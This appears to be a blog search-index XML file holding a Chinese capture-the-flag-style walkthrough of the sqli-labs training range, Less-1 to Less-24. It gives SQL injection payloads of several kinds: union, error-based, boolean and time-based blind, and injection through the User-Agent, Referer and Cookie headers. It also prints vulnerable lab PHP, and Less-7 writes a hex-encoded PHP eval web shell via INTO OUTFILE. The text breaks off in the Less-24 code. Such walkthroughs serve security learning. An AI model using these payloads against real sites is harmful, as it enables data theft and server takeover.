<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sqli-labs通关笔记</title>
    <link href="/2024/09/02/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/02/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h1><p>靶场地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>string型，有回显，回显点2，3，<code>&#39;</code>闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;+order+by+3--+-</span><br><span class="hljs-string">/Less-1/?id=-1&#x27;</span>+union+<span class="hljs-keyword">select</span>+1,2,3--+-<br></code></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>int型，有回显，回显点2，3，<code>无</code>闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-2/?<span class="hljs-built_in">id</span>=1+order+by+3--+<br>/Less-2/?<span class="hljs-built_in">id</span>=-1+union+<span class="hljs-keyword">select</span>+1,2,3--+<br></code></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>string型，有回显，回显点2，3，<code>&#39;)</code>闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-3/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;)+order+by+3--+</span><br><span class="hljs-string">/Less-3/?id=-1&#x27;</span>)+union+<span class="hljs-keyword">select</span>+1,2,3--+<br></code></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>string型，有回显，回显点2，3，<code>&quot;)</code>闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-4/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&quot;)+order+by+3--+</span><br><span class="hljs-string">/Less-4/?id=-1&quot;</span>)+union+<span class="hljs-keyword">select</span>+1,2,3--+<br></code></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>string型，无回显，有报错信息，<code>&#39;</code>闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor%20(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+</span><br><span class="hljs-string">/Less-5/?id=1&#x27;</span>and+updatexml(1,concat(0x7e,database()),1)--+<br>/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;and+extractvalue(1,concat(0x7e,md5(1)))--+</span><br></code></pre></td></tr></table></figure><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>string型，无回显，有报错信息，<code>&quot;</code>闭合，其他同5</p><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>string型，无回显，无报错信息，<code>&#39;))</code>闭合，写文件，<code>chmod 757 dir</code>改了一下文件夹权限，这里留个疑问，有的函数执行不了？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-7/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;))+union+select+1,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e,3+into+outfile+&#x27;</span>/var/www/html/Less-7/1.php<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>string型，无回显，无报错信息，<code>&#39;</code>闭合，布尔盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-8/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;+and+ascii(substr((select+database()),1,1))=115--+</span><br></code></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>string型，无回显，无报错信息，<code>&#39;</code>闭合，时间盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-9/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;+and+if(length(database())=8,sleep(5),null)--+</span><br></code></pre></td></tr></table></figure><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>string型，无回显，无报错信息，<code>&quot;</code>闭合，时间盲注，这一关无论如何，返回的报文是完全一样的，测试闭合的时候需要带着sleep测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Less-10/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&quot;+and+if(length(database())=8,sleep(5),null)--+</span><br></code></pre></td></tr></table></figure><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>string型，无回显，有报错信息，<code>&#39;</code>闭合，布尔盲注</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-11/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>63<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=hami&#x27; <span class="hljs-keyword">or</span> length(database())=8--+&amp;<span class="hljs-attribute">passwd</span>=111&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>string型，无回显，有报错信息，<code>&quot;)</code>闭合，布尔盲注，相比11就是闭合不一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-12/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>47<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=hami&quot;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--+&amp;passwd=111&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>string型，无回显，有报错信息，<code>&#39;)</code>闭合，布尔盲注，相比11就是闭合不一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-13/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>47<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=hami&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--+&amp;passwd=111&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>string型，无回显，有报错信息，<code>&quot;</code>闭合，布尔盲注，相比11就是闭合不一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-14/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>46<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=hami&quot; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--+&amp;passwd=111&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>string型，无回显，无报错信息，<code>&#39;</code>闭合，布尔盲注，测试闭合的时候需要带着布尔盲注参数。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-15/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>61<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=aaa&#x27; <span class="hljs-keyword">or</span> length(database())=8#&amp;<span class="hljs-attribute">passwd</span>=dwaf&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>string型，无回显，无报错信息，<code>&quot;)</code>闭合，布尔盲注，测试闭合的时候需要带着布尔盲注参数。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-16/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>45<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=aaa&quot;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&amp;passwd=dwaf&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>这里有个检测函数，对<code>uname</code>进行了限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>                &#123;<br>                <span class="hljs-comment">// truncation (see comments)</span><br>                <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>                &#125;<br><br>                <span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>                        &#123;<br>                        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>                        &#125;<br><br>                <span class="hljs-comment">// Quote if not a number</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_digit</span>(<span class="hljs-variable">$value</span>))<br>                        &#123;<br>                        <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>                        &#125;<br><br>        <span class="hljs-keyword">else</span><br>                &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$value</span>);<br>                &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>注入点在<code>passwd</code>，无回显，有报错信息，需要有一个有效的<code>uname</code>，然后报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$row1</span>&#x27;&quot;</span>;<br>POST /Less-<span class="hljs-number">17</span>/ HTTP/<span class="hljs-number">1.1</span><br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: <span class="hljs-number">77</span><br><br>uname=admin&amp;passwd=<span class="hljs-number">1</span><span class="hljs-string">&#x27;and+extractvalue(1,concat(0x7e,md5(1)))--+&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>这里使用Less-17中的函数对<code>uname</code>和<code>passwd</code>进行了过滤，注入点在<code>User-Agent</code>，无回显，有报错信息，需要有一对有效的<code>uname</code>和<code>passwd</code>，然后报错注入，这里是<code>INSERT</code>，需要满足语法结构，注意<code>User-Agent</code>里面不能url编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br>POST /Less-<span class="hljs-number">18</span>/ HTTP/<span class="hljs-number">1.1</span><br>Host: localhost<br>User-Agent: <span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,md5(1))) and &#x27;</span><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: <span class="hljs-number">37</span><br><br>uname=admin&amp;passwd=hami&amp;submit=Submit<br></code></pre></td></tr></table></figure><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>注入点换成<code>Referer</code>，其他的同18。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;<br>POST /Less-<span class="hljs-number">19</span>/ HTTP/<span class="hljs-number">1.1</span><br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: <span class="hljs-number">37</span><br>Referer: http:<span class="hljs-comment">//localhost/Less-19/&#x27; and extractvalue(1,concat(0x7e,md5(1))) and &#x27;</span><br><br>uname=admin&amp;passwd=hami&amp;submit=Submit<br></code></pre></td></tr></table></figure><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>注入点在<code>Cookie</code>中，有回显，有报错信息，这里选择了联合注入。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-20/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-20/<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=-1&#x27; union select 1,md5(1),2#; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>注入点在<code>Cookie</code>中，有回显，有报错信息，这里选择了联合注入。相比20就是base64了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-21/<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWFhJykgdW5pb24gc2VsZWN0IDEsbWQ1KDEpLDMj; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>注入点在<code>Cookie</code>中，有回显，有报错信息，这里选择了联合注入。相比21就是闭合不同了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-22/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-22/<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWFhIiB1bmlvbiBzZWxlY3QgMSxtZDUoMSksMyM%3D; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>有回显，有报错信息，这里过滤了注释符号，我们使用对应的闭合符号把后面闭合掉。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-23/?id=-1&#x27;+union+select+1,md5(1),3+or+&#x27;1&#x27;=&#x27;1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><p>二次注入，在创建用户的位置对参数进行了过滤，然后使用<code>insert</code>插入到表中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;/head&gt;<br>&lt;body bgcolor=<span class="hljs-string">&quot;#000000&quot;</span>&gt;<br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;div align=<span class="hljs-string">&quot;right&quot;</span>&gt;<br>&lt;a style=<span class="hljs-string">&quot;font-size:.8em;color:#FFFF00&quot;</span> href=<span class="hljs-string">&#x27;index.php&#x27;</span>&gt;&lt;img src=<span class="hljs-string">&quot;../images/Home.png&quot;</span> height=<span class="hljs-string">&#x27;45&#x27;</span>; width=<span class="hljs-string">&#x27;45&#x27;</span>&gt;&lt;/br&gt;HOME&lt;/a&gt;<br>&lt;/div&gt;<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//including the Mysql connect parameters.</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../sql-connections/sql-connect.php&quot;</span>);<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br><br><br><span class="hljs-comment"># Validating the user input........</span><br><br><span class="hljs-comment">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class="hljs-variable">$username</span>=  <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<br><span class="hljs-variable">$pass</span>= <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$re_pass</span>= <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span 